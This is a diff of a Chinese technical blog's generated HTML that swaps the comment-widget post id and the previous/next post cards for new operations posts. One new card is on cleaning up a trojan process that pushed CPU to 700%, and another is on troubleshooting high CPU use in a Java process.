@@ -872,7 +706,7 @@ No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><
         repo: 'lendea.github.io',
         owner: 'lendea',
         admin: ,
-        id: '2020/07/21/gradle-jar-conclict/',
+        id: '2020/11/13/trojan-process-cpu-100/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1155,51 +989,50 @@ No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/08/12/object-oritened-feature/">
+                <a href="/2020/11/13/trojan-process-cpu-100/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="面向对象的理解">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="记录一次木马进程导致CPU 700%处理经过">
                         
-                        <span class="card-title">面向对象的理解</span>
+                        <span class="card-title">记录一次木马进程导致CPU 700%处理经过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            面向对象的理解面向对象是一种编程风格，可以实现很多复杂的设计思路，是设计原则和设计模式编码实现的基础。
-抽象抽象是一个很宽泛的名词，从大方面上讲，我们需要以面向对象的方式先抽象出业务对象，然后抽象出其属性和行为，最后进行封装。小的方面就是具
+                            事件描述登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。
+处理过程
+为了让机器尽快恢复，用kill -9 18616杀掉了这个进程。没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/编程方法论/" class="post-category" target="_blank">
-                                    编程方法论
+                            <a href="/categories/运维/" class="post-category" target="_blank">
+                                    运维
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/面向对象/" target="_blank">
-                        <span class="chip bg-color">面向对象</span>
-                    </a>
-                    
-                    <a href="/tags/编程方法/" target="_blank">
-                        <span class="chip bg-color">编程方法</span>
+                    <a href="/tags/运维/" target="_blank">
+                        <span class="chip bg-color">运维</span>
                     </a>
                     
                 </div>
@@ -1213,33 +1046,32 @@ No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/20/gradle-dependencied/">
+                <a href="/2020/11/13/java-process-cpu-100/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Gradle依赖(dependencies)类型">
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="Java进程导致CPU使用达到了100%，如何排查，定位，解决该问题？">
                         
-                        <span class="card-title">Gradle依赖(dependencies)类型</span>
+                        <span class="card-title">Java进程导致CPU使用达到了100%，如何排查，定位，解决该问题？</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            简介dependencies用来配置当项目的依赖项。我们常常在gradle配置文件中看到api,implementation,compile……。
-dependencies {
-    testImplementation "org.spr
+                            背景开发生产中，有时候我们会碰到告警，CPU过高，超过100%，这个时候我们应该怎么办？
+解决方案java进程导致CPU过高定位耗费CPU的进程top -c命令,显示进程列表。然后输入P(大写),按照CPU排序。如果是Java进程引起的CP
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-13
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/gradle/" class="post-category" target="_blank">
-                                    gradle
+                            <a href="/categories/运维/" class="post-category" target="_blank">
+                                    运维
                                 </a>
                             
                             
@@ -1249,8 +1081,12 @@ dependencies {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/gradle/" target="_blank">
-                        <span class="chip bg-color">gradle</span>
+                    <a href="/tags/运维/" target="_blank">
+                        <span class="chip bg-color">运维</span>
+                    </a>
+                    
+                    <a href="/tags/面试/" target="_blank">
+                        <span class="chip bg-color">面试</span>
                     </a>
                     
                 </div>
